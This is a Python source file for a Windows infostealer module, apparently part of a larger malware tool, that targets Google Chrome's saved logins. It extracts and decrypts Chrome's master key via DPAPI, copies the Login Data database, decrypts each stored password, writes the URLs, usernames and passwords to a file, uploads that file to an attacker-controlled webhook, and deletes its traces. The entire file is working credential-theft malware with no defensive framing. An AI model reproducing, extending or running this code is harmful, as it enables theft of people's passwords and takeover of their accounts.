from utils import *

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time
from datetime import datetime, timedelta

class PasswordLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "password_log.txt") 

    # TODO microsoft edge passwords
    def log_passwords(self):
        try:
            encryption_key = ""
            try:
                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
                with open(local_state_path, "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                encryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            except: 
                time.sleep(1)
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            file_name = "ChromeData.db"
            shutil.copyfile(db_path, file_name)
            conn = sqlite3.connect(file_name)
            cursor = conn.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            result = {}
            for row in cursor.fetchall():
                action_url = row[1]
                username = row[2]
                password = row[3]
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
                    password = cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        password = str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        password = "N/A"
                if username or password:
                    result[action_url] = (username, password)
            conn.close()
            os.remove(file_name)
            with open(self.log_file, "w") as f:
                f.write("Password History:\n\n")
                for url, creds in result.items():
                    f.write(f"{url}: {creds[0]} - {creds[1]}\n")
            send_webhook(self.webhook_url, file={"password_logs.txt": open(self.log_file, "rb")})
            os.remove(self.log_file)
        except Exception as e:
            send_webhook(self.webhook_url, f"```❌ Error logging passwords: {e}```")

    def start(self):
        self.log_passwords()
        return
